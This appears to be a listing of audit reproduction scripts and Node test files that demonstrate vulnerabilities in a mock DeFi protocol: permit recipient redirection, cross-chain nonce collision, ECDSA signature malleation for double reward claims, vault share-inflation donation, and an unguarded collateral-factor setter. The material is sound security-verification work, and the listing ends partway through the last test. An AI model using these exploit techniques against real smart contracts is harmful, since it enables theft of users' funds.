run/evidence/C-003/reproduce.sh:1:#!/usr/bin/env bash
run/evidence/C-003/reproduce.sh:2:set -euo pipefail
run/evidence/C-003/reproduce.sh:3:cd "$(dirname "$0")/../../.."
run/evidence/C-003/reproduce.sh:4:node --test --test-concurrency=1 run/evidence/C-003/repro.test.mjs
run/evidence/C-003/repro.test.mjs:1:import assert from "node:assert/strict";
run/evidence/C-003/repro.test.mjs:2:import { before, test } from "node:test";
run/evidence/C-003/repro.test.mjs:3:import { blockDeadline, compileAll, deploy, ether, ethers, expectRevert, makeChain, send } from "../../../test/support.mjs";
run/evidence/C-003/repro.test.mjs:5:let artifacts;
run/evidence/C-003/repro.test.mjs:7:before(async () => {
run/evidence/C-003/repro.test.mjs:8:  artifacts = await compileAll();
run/evidence/C-003/repro.test.mjs:9:});
run/evidence/C-003/repro.test.mjs:11:async function setup() {
run/evidence/C-003/repro.test.mjs:12:  const chain = await makeChain();
run/evidence/C-003/repro.test.mjs:13:  const [admin, owner, intendedRecipient, attackerRelayer] = chain.signers;
run/evidence/C-003/repro.test.mjs:14:  const ownerWallet = chain.wallets[1];
run/evidence/C-003/repro.test.mjs:15:  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
run/evidence/C-003/repro.test.mjs:16:  const router = await deploy(artifacts, "PermitRouter", admin);
run/evidence/C-003/repro.test.mjs:17:  await send(token.mint(await owner.getAddress(), ether(50)));
run/evidence/C-003/repro.test.mjs:18:  await send(token.connect(owner).approve(await router.getAddress(), ether(50)));
run/evidence/C-003/repro.test.mjs:19:  const deadline = await blockDeadline(chain.provider);
run/evidence/C-003/repro.test.mjs:20:  return { chain, owner, ownerWallet, intendedRecipient, attackerRelayer, token, router, deadline };
run/evidence/C-003/repro.test.mjs:21:}
run/evidence/C-003/repro.test.mjs:23:async function signCurrentPermit({ owner, ownerWallet, token, router, deadline }, amount) {
run/evidence/C-003/repro.test.mjs:24:  const nonce = await router.nonces(await owner.getAddress());
run/evidence/C-003/repro.test.mjs:25:  const payload = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(
run/evidence/C-003/repro.test.mjs:26:    ["bytes32", "address", "address", "uint256", "uint256", "uint256"],
run/evidence/C-003/repro.test.mjs:27:    [await router.TRANSFER_TYPEHASH(), await owner.getAddress(), await token.getAddress(), amount, nonce, deadline]
run/evidence/C-003/repro.test.mjs:28:  ));
run/evidence/C-003/repro.test.mjs:29:  return ownerWallet.signMessage(ethers.getBytes(payload));
run/evidence/C-003/repro.test.mjs:30:}
run/evidence/C-003/repro.test.mjs:32:test("positive: relayer redirects a valid transfer signature because recipient is not signed", async () => {
run/evidence/C-003/repro.test.mjs:33:  const context = await setup();
run/evidence/C-003/repro.test.mjs:34:  const amount = ether(25);
run/evidence/C-003/repro.test.mjs:35:  const intended = await context.intendedRecipient.getAddress();
run/evidence/C-003/repro.test.mjs:36:  const attacker = await context.attackerRelayer.getAddress();
run/evidence/C-003/repro.test.mjs:37:  const signature = await signCurrentPermit(context, amount);
run/evidence/C-003/repro.test.mjs:39:  await send(context.router.connect(context.attackerRelayer).executeTransfer(
run/evidence/C-003/repro.test.mjs:40:    await context.owner.getAddress(), await context.token.getAddress(), amount, attacker, context.deadline, signature
run/evidence/C-003/repro.test.mjs:41:  ));
run/evidence/C-003/repro.test.mjs:43:  assert.equal(await context.token.balanceOf(intended), 0n);
run/evidence/C-003/repro.test.mjs:44:  assert.equal(await context.token.balanceOf(attacker), amount);
run/evidence/C-003/repro.test.mjs:45:  assert.equal(await context.router.nonces(await context.owner.getAddress()), 1n);
run/evidence/C-003/repro.test.mjs:46:  console.log(JSON.stringify({ oracle: "C-003-positive", intendedRecipient: intended, actualRecipient: attacker, intendedBalance: "0", attackerBalance: String(amount), nonceAfter: "1" }));
run/evidence/C-003/repro.test.mjs:47:});
run/evidence/C-003/repro.test.mjs:49:test("negative: changing an encoded amount invalidates the same kind of signature", async () => {
run/evidence/C-003/repro.test.mjs:50:  const context = await setup();
run/evidence/C-003/repro.test.mjs:51:  const signedAmount = ether(25);
run/evidence/C-003/repro.test.mjs:52:  const alteredAmount = signedAmount + 1n;
run/evidence/C-003/repro.test.mjs:53:  const attacker = await context.attackerRelayer.getAddress();
run/evidence/C-003/repro.test.mjs:54:  const signature = await signCurrentPermit(context, signedAmount);
run/evidence/C-003/repro.test.mjs:56:  await expectRevert(context.router.connect(context.attackerRelayer).executeTransfer(
run/evidence/C-003/repro.test.mjs:57:    await context.owner.getAddress(), await context.token.getAddress(), alteredAmount, attacker, context.deadline, signature
run/evidence/C-003/repro.test.mjs:58:  ));
run/evidence/C-003/repro.test.mjs:59:  assert.equal(await context.token.balanceOf(attacker), 0n);
run/evidence/C-003/repro.test.mjs:60:  assert.equal(await context.router.nonces(await context.owner.getAddress()), 0n);
run/evidence/C-003/repro.test.mjs:61:  console.log(JSON.stringify({ oracle: "C-003-negative", encodedAmountChangeRejected: true, attackerBalance: "0", nonceAfter: "0" }));
run/evidence/C-003/repro.test.mjs:62:});
run/evidence/C-007/reproduce.sh:1:#!/usr/bin/env bash
run/evidence/C-007/reproduce.sh:2:set -euo pipefail
run/evidence/C-007/reproduce.sh:3:cd "$(dirname "$0")/../../.."
run/evidence/C-007/reproduce.sh:4:node --test --test-concurrency=1 run/evidence/C-007/repro.test.mjs
run/evidence/C-011/reproduce.sh:1:#!/usr/bin/env bash
run/evidence/C-011/reproduce.sh:2:set -euo pipefail
run/evidence/C-011/reproduce.sh:3:cd "$(dirname "$0")/../../.."
run/evidence/C-011/reproduce.sh:4:node --test --test-concurrency=1 run/evidence/C-011/repro.test.mjs
run/evidence/C-007/repro.test.mjs:1:import assert from "node:assert/strict";
run/evidence/C-007/repro.test.mjs:2:import { before, test } from "node:test";
run/evidence/C-007/repro.test.mjs:3:import { compileAll, deploy, ether, expectRevert, makeChain, send } from "../../../test/support.mjs";
run/evidence/C-007/repro.test.mjs:5:const comparatorSource = `
run/evidence/C-007/repro.test.mjs:6:// SPDX-License-Identifier: MIT
run/evidence/C-007/repro.test.mjs:7:pragma solidity 0.8.30;
run/evidence/C-007/repro.test.mjs:9:interface IMessageContextC007 {
run/evidence/C-007/repro.test.mjs:10:    function xDomainMessageSender() external view returns (address);
run/evidence/C-007/repro.test.mjs:11:    function xDomainSourceChain() external view returns (uint32);
run/evidence/C-007/repro.test.mjs:12:}
run/evidence/C-007/repro.test.mjs:13:interface IBridgeReceiverC007 {
run/evidence/C-007/repro.test.mjs:14:    function onBridgeCredit(address beneficiary, uint256 shares) external;
run/evidence/C-007/repro.test.mjs:15:}
run/evidence/C-007/repro.test.mjs:16:contract BridgeGatewayNonceFixedC007 {
run/evidence/C-007/repro.test.mjs:17:    IMessageContextC007 public immutable messenger;
run/evidence/C-007/repro.test.mjs:18:    IBridgeReceiverC007 public immutable receiver;
run/evidence/C-007/repro.test.mjs:19:    address public admin;
run/evidence/C-007/repro.test.mjs:20:    mapping(uint32 => address) public remoteGateway;
run/evidence/C-007/repro.test.mjs:21:    mapping(uint32 => mapping(uint64 => bool)) public processedNonce;
run/evidence/C-007/repro.test.mjs:22:    constructor(IMessageContextC007 messenger_, IBridgeReceiverC007 receiver_, address admin_) {
run/evidence/C-007/repro.test.mjs:23:        messenger = messenger_; receiver = receiver_; admin = admin_;
run/evidence/C-007/repro.test.mjs:24:    }
run/evidence/C-007/repro.test.mjs:25:    function configureRemote(uint32 sourceChain, address gateway) external {
run/evidence/C-007/repro.test.mjs:26:        require(msg.sender == admin, "ADMIN"); remoteGateway[sourceChain] = gateway;
run/evidence/C-007/repro.test.mjs:27:    }
run/evidence/C-007/repro.test.mjs:28:    function finalizeCollateral(uint32 sourceChain, uint64 nonce, address beneficiary, uint256 shares) external {
run/evidence/C-007/repro.test.mjs:29:        require(msg.sender == address(messenger), "MESSENGER");
run/evidence/C-007/repro.test.mjs:30:        require(messenger.xDomainSourceChain() == sourceChain, "SOURCE_CHAIN");
run/evidence/C-007/repro.test.mjs:31:        require(remoteGateway[sourceChain] != address(0), "UNSUPPORTED");
run/evidence/C-007/repro.test.mjs:32:        require(!processedNonce[sourceChain][nonce], "PROCESSED");
run/evidence/C-007/repro.test.mjs:33:        processedNonce[sourceChain][nonce] = true;
run/evidence/C-007/repro.test.mjs:34:        receiver.onBridgeCredit(beneficiary, shares);
run/evidence/C-007/repro.test.mjs:35:    }
run/evidence/C-007/repro.test.mjs:36:}
run/evidence/C-007/repro.test.mjs:37:`;
run/evidence/C-007/repro.test.mjs:39:let artifacts;
run/evidence/C-007/repro.test.mjs:41:before(async () => {
run/evidence/C-007/repro.test.mjs:42:  artifacts = await compileAll({
run/evidence/C-007/repro.test.mjs:43:    additionalSources: { "run/evidence/C-007/BridgeGatewayNonceFixedC007.sol": comparatorSource }
run/evidence/C-007/repro.test.mjs:44:  });
run/evidence/C-007/repro.test.mjs:45:});
run/evidence/C-007/repro.test.mjs:47:async function setup(gatewayContract = "BridgeGateway") {
run/evidence/C-007/repro.test.mjs:48:  const chain = await makeChain();
run/evidence/C-007/repro.test.mjs:49:  const [admin, beneficiaryA, beneficiaryB, remoteA, remoteB] = chain.signers;
run/evidence/C-007/repro.test.mjs:50:  const asset = await deploy(artifacts, "MockERC20", admin, ["Aster Asset", "AST", 18]);
run/evidence/C-007/repro.test.mjs:51:  const stable = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
run/evidence/C-007/repro.test.mjs:52:  const vault = await deploy(artifacts, "AsterVault", admin, [await asset.getAddress()]);
run/evidence/C-007/repro.test.mjs:53:  const pool = await deploy(artifacts, "ReservePool", admin, [await asset.getAddress(), await stable.getAddress()]);
run/evidence/C-007/repro.test.mjs:54:  const feed = await deploy(artifacts, "MockFeed", admin, [8, 100_000_000]);
run/evidence/C-007/repro.test.mjs:55:  const oracle = await deploy(artifacts, "ReserveOracle", admin, [await feed.getAddress(), await pool.getAddress()]);
run/evidence/C-007/repro.test.mjs:56:  const market = await deploy(artifacts, "LendingMarket", admin, [
run/evidence/C-007/repro.test.mjs:57:    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(), await admin.getAddress()
run/evidence/C-007/repro.test.mjs:58:  ]);
run/evidence/C-007/repro.test.mjs:59:  const messenger = await deploy(artifacts, "MockMessenger", admin);
run/evidence/C-007/repro.test.mjs:60:  const gateway = await deploy(artifacts, gatewayContract, admin, [
run/evidence/C-007/repro.test.mjs:61:    await messenger.getAddress(), await market.getAddress(), await admin.getAddress()
run/evidence/C-007/repro.test.mjs:62:  ]);
run/evidence/C-007/repro.test.mjs:63:  await send(gateway.configureRemote(10, await remoteA.getAddress()));
run/evidence/C-007/repro.test.mjs:64:  await send(gateway.configureRemote(20, await remoteB.getAddress()));
run/evidence/C-007/repro.test.mjs:65:  await send(market.setBridge(await gateway.getAddress()));
run/evidence/C-007/repro.test.mjs:66:  return { beneficiaryA, beneficiaryB, remoteA, remoteB, market, messenger, gateway };
run/evidence/C-007/repro.test.mjs:67:}
run/evidence/C-007/repro.test.mjs:69:function message(gateway, chain, nonce, beneficiary, shares) {
run/evidence/C-007/repro.test.mjs:70:  return gateway.interface.encodeFunctionData("finalizeCollateral", [chain, nonce, beneficiary, shares]);
run/evidence/C-007/repro.test.mjs:71:}
run/evidence/C-007/repro.test.mjs:73:test("positive: a valid nonce on one configured source chain blocks the same nonce on another", async () => {
run/evidence/C-007/repro.test.mjs:74:  const { beneficiaryA, beneficiaryB, remoteA, remoteB, market, messenger, gateway } = await setup();
run/evidence/C-007/repro.test.mjs:75:  const accountA = await beneficiaryA.getAddress();
run/evidence/C-007/repro.test.mjs:76:  const accountB = await beneficiaryB.getAddress();
run/evidence/C-007/repro.test.mjs:77:  const nonce = 7;
run/evidence/C-007/repro.test.mjs:79:  await send(messenger.relay(
run/evidence/C-007/repro.test.mjs:80:    await gateway.getAddress(), 10, await remoteA.getAddress(), message(gateway, 10, nonce, accountA, ether(1))
run/evidence/C-007/repro.test.mjs:81:  ));
run/evidence/C-007/repro.test.mjs:82:  await expectRevert(messenger.relay(
run/evidence/C-007/repro.test.mjs:83:    await gateway.getAddress(), 20, await remoteB.getAddress(), message(gateway, 20, nonce, accountB, ether(2))
run/evidence/C-007/repro.test.mjs:84:  ));
run/evidence/C-007/repro.test.mjs:86:  assert.equal(await market.bridgeCollateral(accountA), ether(1));
run/evidence/C-007/repro.test.mjs:87:  assert.equal(await market.bridgeCollateral(accountB), 0n);
run/evidence/C-007/repro.test.mjs:88:  assert.equal(await gateway.processedNonce(nonce), true);
run/evidence/C-007/repro.test.mjs:89:  console.log(JSON.stringify({ oracle: "C-007-positive", sharedNonce: String(nonce), chain10Credit: String(await market.bridgeCollateral(accountA)), chain20Credit: "0", secondValidMessageRejected: true }));
run/evidence/C-007/repro.test.mjs:90:});
run/evidence/C-007/repro.test.mjs:92:test("negative comparator: chain-scoped replay keys accept both valid messages", async () => {
run/evidence/C-007/repro.test.mjs:93:  const { beneficiaryA, beneficiaryB, remoteA, remoteB, market, messenger, gateway } = await setup("BridgeGatewayNonceFixedC007");
run/evidence/C-007/repro.test.mjs:94:  const accountA = await beneficiaryA.getAddress();
run/evidence/C-007/repro.test.mjs:95:  const accountB = await beneficiaryB.getAddress();
run/evidence/C-007/repro.test.mjs:96:  const nonce = 7;
run/evidence/C-007/repro.test.mjs:98:  await send(messenger.relay(
run/evidence/C-007/repro.test.mjs:99:    await gateway.getAddress(), 10, await remoteA.getAddress(), message(gateway, 10, nonce, accountA, ether(1))
run/evidence/C-007/repro.test.mjs:100:  ));
run/evidence/C-007/repro.test.mjs:101:  await send(messenger.relay(
run/evidence/C-007/repro.test.mjs:102:    await gateway.getAddress(), 20, await remoteB.getAddress(), message(gateway, 20, nonce, accountB, ether(2))
run/evidence/C-007/repro.test.mjs:103:  ));
run/evidence/C-007/repro.test.mjs:105:  assert.equal(await market.bridgeCollateral(accountA), ether(1));
run/evidence/C-007/repro.test.mjs:106:  assert.equal(await market.bridgeCollateral(accountB), ether(2));
run/evidence/C-007/repro.test.mjs:107:  console.log(JSON.stringify({ oracle: "C-007-negative", chainScopedNonce: String(nonce), chain10Credit: String(await market.bridgeCollateral(accountA)), chain20Credit: String(await market.bridgeCollateral(accountB)) }));
run/evidence/C-007/repro.test.mjs:108:});
run/evidence/C-004/reproduce.sh:1:#!/usr/bin/env bash
run/evidence/C-004/reproduce.sh:2:set -euo pipefail
run/evidence/C-004/reproduce.sh:3:cd "$(dirname "$0")/../../.."
run/evidence/C-004/reproduce.sh:4:node --test --test-concurrency=1 run/evidence/C-004/repro.test.mjs
run/evidence/C-004/repro.test.mjs:1:import assert from "node:assert/strict";
run/evidence/C-004/repro.test.mjs:2:import { before, test } from "node:test";
run/evidence/C-004/repro.test.mjs:3:import { compileAll, deploy, ether, ethers, expectRevert, makeChain, send } from "../../../test/support.mjs";
run/evidence/C-004/repro.test.mjs:5:const secp256k1N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n;
run/evidence/C-004/repro.test.mjs:6:let artifacts;
run/evidence/C-004/repro.test.mjs:8:before(async () => {
run/evidence/C-004/repro.test.mjs:9:  artifacts = await compileAll();
run/evidence/C-004/repro.test.mjs:10:});
run/evidence/C-004/repro.test.mjs:12:async function setup() {
run/evidence/C-004/repro.test.mjs:13:  const chain = await makeChain();
run/evidence/C-004/repro.test.mjs:14:  const [admin, authority, claimant, relayer] = chain.signers;
run/evidence/C-004/repro.test.mjs:15:  const authorityWallet = chain.wallets[1];
run/evidence/C-004/repro.test.mjs:16:  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Reward", "ARW", 18]);
run/evidence/C-004/repro.test.mjs:17:  const distributor = await deploy(artifacts, "RewardsDistributor", admin, [
run/evidence/C-004/repro.test.mjs:18:    await token.getAddress(), await authority.getAddress()
run/evidence/C-004/repro.test.mjs:19:  ]);
run/evidence/C-004/repro.test.mjs:20:  await send(token.mint(await distributor.getAddress(), ether(100)));
run/evidence/C-004/repro.test.mjs:21:  return { authorityWallet, claimant, relayer, token, distributor };
run/evidence/C-004/repro.test.mjs:22:}
run/evidence/C-004/repro.test.mjs:24:function malleate(signature) {
run/evidence/C-004/repro.test.mjs:25:  const parsed = ethers.Signature.from(signature);
run/evidence/C-004/repro.test.mjs:26:  const alternateS = secp256k1N - BigInt(parsed.s);
run/evidence/C-004/repro.test.mjs:27:  const alternateV = parsed.v === 27 ? 28 : 27;
run/evidence/C-004/repro.test.mjs:28:  return ethers.hexlify(ethers.concat([
run/evidence/C-004/repro.test.mjs:29:    parsed.r,
run/evidence/C-004/repro.test.mjs:30:    ethers.toBeHex(alternateS, 32),
run/evidence/C-004/repro.test.mjs:31:    ethers.toBeHex(alternateV, 1)
run/evidence/C-004/repro.test.mjs:32:  ]));
run/evidence/C-004/repro.test.mjs:33:}
run/evidence/C-004/repro.test.mjs:35:async function signedClaim(context, amount = ether(20), nonce = 7n) {
run/evidence/C-004/repro.test.mjs:36:  const account = await context.claimant.getAddress();
run/evidence/C-004/repro.test.mjs:37:  const payload = await context.distributor.claimPayload(account, amount, nonce);
run/evidence/C-004/repro.test.mjs:38:  const signature = await context.authorityWallet.signMessage(ethers.getBytes(payload));
run/evidence/C-004/repro.test.mjs:39:  return { account, payload, signature, alternate: malleate(signature), amount, nonce };
run/evidence/C-004/repro.test.mjs:40:}
run/evidence/C-004/repro.test.mjs:42:test("positive: high-s alternate encoding bypasses signature-byte replay tracking", async () => {
run/evidence/C-004/repro.test.mjs:43:  const context = await setup();
run/evidence/C-004/repro.test.mjs:44:  const claim = await signedClaim(context);
run/evidence/C-004/repro.test.mjs:45:  assert.notEqual(claim.signature, claim.alternate);
run/evidence/C-004/repro.test.mjs:46:  assert.notEqual(ethers.keccak256(claim.signature), ethers.keccak256(claim.alternate));
run/evidence/C-004/repro.test.mjs:48:  await send(context.distributor.connect(context.relayer).claim(
run/evidence/C-004/repro.test.mjs:49:    claim.account, claim.amount, claim.nonce, claim.signature
run/evidence/C-004/repro.test.mjs:50:  ));
run/evidence/C-004/repro.test.mjs:51:  await send(context.distributor.connect(context.relayer).claim(
run/evidence/C-004/repro.test.mjs:52:    claim.account, claim.amount, claim.nonce, claim.alternate
run/evidence/C-004/repro.test.mjs:53:  ));
run/evidence/C-004/repro.test.mjs:55:  const paid = await context.token.balanceOf(claim.account);
run/evidence/C-004/repro.test.mjs:56:  assert.equal(paid, claim.amount * 2n);
run/evidence/C-004/repro.test.mjs:57:  assert.equal(await context.distributor.usedSignatures(ethers.keccak256(claim.signature)), true);
run/evidence/C-004/repro.test.mjs:58:  assert.equal(await context.distributor.usedSignatures(ethers.keccak256(claim.alternate)), true);
run/evidence/C-004/repro.test.mjs:59:  console.log(JSON.stringify({ oracle: "C-004-positive", samePayload: claim.payload, canonicalId: ethers.keccak256(claim.signature), alternateId: ethers.keccak256(claim.alternate), authorizedAmount: String(claim.amount), paid: String(paid) }));
run/evidence/C-004/repro.test.mjs:60:});
run/evidence/C-004/repro.test.mjs:62:test("negative: byte-identical replay is rejected and pays only once", async () => {
run/evidence/C-004/repro.test.mjs:63:  const context = await setup();
run/evidence/C-004/repro.test.mjs:64:  const claim = await signedClaim(context);
run/evidence/C-004/repro.test.mjs:65:  await send(context.distributor.connect(context.relayer).claim(
run/evidence/C-004/repro.test.mjs:66:    claim.account, claim.amount, claim.nonce, claim.signature
run/evidence/C-004/repro.test.mjs:67:  ));
run/evidence/C-004/repro.test.mjs:68:  await expectRevert(context.distributor.connect(context.relayer).claim(
run/evidence/C-004/repro.test.mjs:69:    claim.account, claim.amount, claim.nonce, claim.signature
run/evidence/C-004/repro.test.mjs:70:  ));
run/evidence/C-004/repro.test.mjs:71:  const paid = await context.token.balanceOf(claim.account);
run/evidence/C-004/repro.test.mjs:72:  assert.equal(paid, claim.amount);
run/evidence/C-004/repro.test.mjs:73:  console.log(JSON.stringify({ oracle: "C-004-negative", identicalReplayRejected: true, authorizedAmount: String(claim.amount), paid: String(paid) }));
run/evidence/C-004/repro.test.mjs:74:});
run/evidence/C-011/repro.test.mjs:1:import assert from "node:assert/strict";
run/evidence/C-011/repro.test.mjs:2:import { before, test } from "node:test";
run/evidence/C-011/repro.test.mjs:3:import { compileAll, deploy, ether, expectRevert, makeChain, send } from "../../../test/support.mjs";
run/evidence/C-011/repro.test.mjs:5:let artifacts;
run/evidence/C-011/repro.test.mjs:7:before(async () => {
run/evidence/C-011/repro.test.mjs:8:  artifacts = await compileAll();
run/evidence/C-011/repro.test.mjs:9:});
run/evidence/C-011/repro.test.mjs:11:async function setup() {
run/evidence/C-011/repro.test.mjs:12:  const chain = await makeChain();
run/evidence/C-011/repro.test.mjs:13:  const [admin, attacker, victim] = chain.signers;
run/evidence/C-011/repro.test.mjs:14:  const asset = await deploy(artifacts, "MockERC20", admin, ["Aster Asset", "AST", 18]);
run/evidence/C-011/repro.test.mjs:15:  const vault = await deploy(artifacts, "AsterVault", admin, [await asset.getAddress()]);
run/evidence/C-011/repro.test.mjs:16:  const attackerAddress = await attacker.getAddress();
run/evidence/C-011/repro.test.mjs:17:  const victimAddress = await victim.getAddress();
run/evidence/C-011/repro.test.mjs:18:  await send(asset.mint(attackerAddress, ether(1_000) + 1n));
run/evidence/C-011/repro.test.mjs:19:  await send(asset.mint(victimAddress, ether(1_000)));
run/evidence/C-011/repro.test.mjs:20:  await send(asset.connect(attacker).approve(await vault.getAddress(), 1n));
run/evidence/C-011/repro.test.mjs:21:  await send(asset.connect(victim).approve(await vault.getAddress(), ether(1_000)));
run/evidence/C-011/repro.test.mjs:22:  return { attacker, victim, attackerAddress, victimAddress, asset, vault };
run/evidence/C-011/repro.test.mjs:23:}
run/evidence/C-011/repro.test.mjs:25:test("positive: recoverable first-share donation makes a victim deposit mint zero and revert", async () => {
run/evidence/C-011/repro.test.mjs:26:  const context = await setup();
run/evidence/C-011/repro.test.mjs:27:  const attackerStartingAssets = await context.asset.balanceOf(context.attackerAddress);
run/evidence/C-011/repro.test.mjs:28:  const victimStartingAssets = await context.asset.balanceOf(context.victimAddress);
run/evidence/C-011/repro.test.mjs:30:  await send(context.vault.connect(context.attacker).deposit(1n, context.attackerAddress));
run/evidence/C-011/repro.test.mjs:31:  assert.equal(await context.vault.totalSupply(), 1n);
run/evidence/C-011/repro.test.mjs:32:  await send(context.asset.connect(context.attacker).transfer(
run/evidence/C-011/repro.test.mjs:33:    await context.vault.getAddress(), ether(1_000)
run/evidence/C-011/repro.test.mjs:34:  ));
run/evidence/C-011/repro.test.mjs:35:  assert.equal(await context.vault.convertToShares(ether(1_000)), 0n);
run/evidence/C-011/repro.test.mjs:37:  await expectRevert(context.vault.connect(context.victim).deposit(
run/evidence/C-011/repro.test.mjs:38:    ether(1_000), context.victimAddress
run/evidence/C-011/repro.test.mjs:39:  ));
run/evidence/C-011/repro.test.mjs:40:  assert.equal(await context.vault.balanceOf(context.victimAddress), 0n);
run/evidence/C-011/repro.test.mjs:41:  assert.equal(await context.asset.balanceOf(context.victimAddress), victimStartingAssets);
run/evidence/C-011/repro.test.mjs:43:  await send(context.vault.connect(context.attacker).redeem(
run/evidence/C-011/repro.test.mjs:44:    1n, context.attackerAddress, context.attackerAddress
run/evidence/C-011/repro.test.mjs:45:  ));
run/evidence/C-011/repro.test.mjs:46:  assert.equal(await context.asset.balanceOf(context.attackerAddress), attackerStartingAssets);
run/evidence/C-011/repro.test.mjs:47:  assert.equal(await context.vault.totalSupply(), 0n);
run/evidence/C-011/repro.test.mjs:48:  console.log(JSON.stringify({ oracle: "C-011-positive", seedShare: "1", recoverableDonation: String(ether(1_000)), victimDeposit: String(victimStartingAssets), victimShares: "0", attackerAssetsAfterRecovery: String(await context.asset.balanceOf(context.attackerAddress)), capitalLoss: "0" }));
run/evidence/C-011/repro.test.mjs:49:});
run/evidence/C-011/repro.test.mjs:51:test("negative: without exchange-rate donation the same victim deposit succeeds", async () => {
run/evidence/C-011/repro.test.mjs:52:  const context = await setup();
run/evidence/C-011/repro.test.mjs:53:  await send(context.vault.connect(context.attacker).deposit(1n, context.attackerAddress));
run/evidence/C-011/repro.test.mjs:54:  await send(context.vault.connect(context.victim).deposit(ether(1_000), context.victimAddress));
run/evidence/C-011/repro.test.mjs:55:  assert.equal(await context.vault.balanceOf(context.victimAddress), ether(1_000));
run/evidence/C-011/repro.test.mjs:56:  assert.equal(await context.asset.balanceOf(context.victimAddress), 0n);
run/evidence/C-011/repro.test.mjs:57:  console.log(JSON.stringify({ oracle: "C-011-negative", donation: "0", victimDepositSucceeded: true, victimShares: String(await context.vault.balanceOf(context.victimAddress)) }));
run/evidence/C-011/repro.test.mjs:58:});
run/evidence/C-008/reproduce.sh:1:#!/usr/bin/env bash
run/evidence/C-008/reproduce.sh:2:set -euo pipefail
run/evidence/C-008/reproduce.sh:3:cd "$(dirname "$0")/../../.."
run/evidence/C-008/reproduce.sh:4:node --test --test-concurrency=1 run/evidence/C-008/repro.test.mjs
run/evidence/C-006/repro.test.mjs:1:import assert from "node:assert/strict";
run/evidence/C-006/repro.test.mjs:2:import { before, test } from "node:test";
run/evidence/C-006/repro.test.mjs:3:import { compileAll, deploy, ether, expectRevert, makeChain, send } from "../../../test/support.mjs";
run/evidence/C-006/repro.test.mjs:5:let artifacts;
run/evidence/C-006/repro.test.mjs:7:before(async () => {
run/evidence/C-006/repro.test.mjs:8:  artifacts = await compileAll();
run/evidence/C-006/repro.test.mjs:9:});
run/evidence/C-006/repro.test.mjs:11:async function setup() {
run/evidence/C-006/repro.test.mjs:12:  const chain = await makeChain();
run/evidence/C-006/repro.test.mjs:13:  const [guardian, attacker] = chain.signers;
run/evidence/C-006/repro.test.mjs:14:  const asset = await deploy(artifacts, "MockERC20", guardian, ["Aster Asset", "AST", 18]);
run/evidence/C-006/repro.test.mjs:15:  const stable = await deploy(artifacts, "MockERC20", guardian, ["Aster Dollar", "aUSD", 18]);
run/evidence/C-006/repro.test.mjs:16:  const vault = await deploy(artifacts, "AsterVault", guardian, [await asset.getAddress()]);
run/evidence/C-006/repro.test.mjs:17:  const pool = await deploy(artifacts, "ReservePool", guardian, [await asset.getAddress(), await stable.getAddress()]);
run/evidence/C-006/repro.test.mjs:18:  const feed = await deploy(artifacts, "MockFeed", guardian, [8, 100_000_000]);
run/evidence/C-006/repro.test.mjs:19:  const oracle = await deploy(artifacts, "ReserveOracle", guardian, [await feed.getAddress(), await pool.getAddress()]);
run/evidence/C-006/repro.test.mjs:20:  const market = await deploy(artifacts, "LendingMarket", guardian, [
run/evidence/C-006/repro.test.mjs:21:    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(), await guardian.getAddress()
run/evidence/C-006/repro.test.mjs:22:  ]);
run/evidence/C-006/repro.test.mjs:23:  const attackerAddress = await attacker.getAddress();
run/evidence/C-006/repro.test.mjs:24:  await send(stable.mint(await market.getAddress(), ether(10_000)));
run/evidence/C-006/repro.test.mjs:25:  await send(asset.mint(attackerAddress, ether(1_000)));
run/evidence/C-006/repro.test.mjs:26:  await send(asset.connect(attacker).approve(await vault.getAddress(), ether(1_000)));
run/evidence/C-006/repro.test.mjs:27:  await send(vault.connect(attacker).deposit(ether(1_000), attackerAddress));
run/evidence/C-006/repro.test.mjs:28:  await send(vault.connect(attacker).approve(await market.getAddress(), ether(1_000)));
run/evidence/C-006/repro.test.mjs:29:  await send(market.connect(attacker).depositCollateral(ether(1_000), attackerAddress));
run/evidence/C-006/repro.test.mjs:30:  return { guardian, attacker, attackerAddress, stable, market };
run/evidence/C-006/repro.test.mjs:31:}
run/evidence/C-006/repro.test.mjs:33:test("positive: ordinary borrower raises global collateral factor and extracts above configured limit", async () => {
run/evidence/C-006/repro.test.mjs:34:  const { attacker, attackerAddress, stable, market } = await setup();
run/evidence/C-006/repro.test.mjs:35:  const initialFactor = await market.collateralFactorBps();
run/evidence/C-006/repro.test.mjs:36:  const initialLimit = await market.borrowLimit(attackerAddress);
run/evidence/C-006/repro.test.mjs:37:  assert.equal(initialFactor, 7_500n);
run/evidence/C-006/repro.test.mjs:38:  assert.equal(initialLimit, ether(750));
run/evidence/C-006/repro.test.mjs:39:  await expectRevert(market.connect(attacker).borrow(ether(950), attackerAddress, "0x"));
run/evidence/C-006/repro.test.mjs:41:  await send(market.connect(attacker).setCollateralFactor(9_500));
run/evidence/C-006/repro.test.mjs:42:  const raisedLimit = await market.borrowLimit(attackerAddress);
run/evidence/C-006/repro.test.mjs:43:  // Use a distinct calldata amount after the expected pre-change revert so the
run/evidence/C-006/repro.test.mjs:44:  // Ganache/ethers estimate cache cannot reuse the stale failed estimation.
run/evidence/C-006/repro.test.mjs:45:  await send(market.connect(attacker).borrow(ether(949), attackerAddress, "0x"));
run/evidence/C-006/repro.test.mjs:47:  assert.equal(await market.collateralFactorBps(), 9_500n);
run/evidence/C-006/repro.test.mjs:48:  assert.equal(raisedLimit, ether(950));
run/evidence/C-006/repro.test.mjs:49:  assert.equal(await market.debt(attackerAddress), ether(949));
run/evidence/C-006/repro.test.mjs:50:  assert.equal(await stable.balanceOf(attackerAddress), ether(949));
run/evidence/C-006/repro.test.mjs:51:  assert((await market.debt(attackerAddress)) > initialLimit);
run/evidence/C-006/repro.test.mjs:52:  console.log(JSON.stringify({ oracle: "C-006-positive", callerIsGuardian: false, initialFactor: String(initialFactor), factorAfter: String(await market.collateralFactorBps()), initialLimit: String(initialLimit), debtAfter: String(await market.debt(attackerAddress)), attackerStable: String(await stable.balanceOf(attackerAddress)) }));
run/evidence/C-006/repro.test.mjs:53:});
run/evidence/C-006/repro.test.mjs:55:test("negative: the same ordinary caller is rejected when lowering the parameter", async () => {
run/evidence/C-006/repro.test.mjs:56:  const { attacker, market } = await setup();
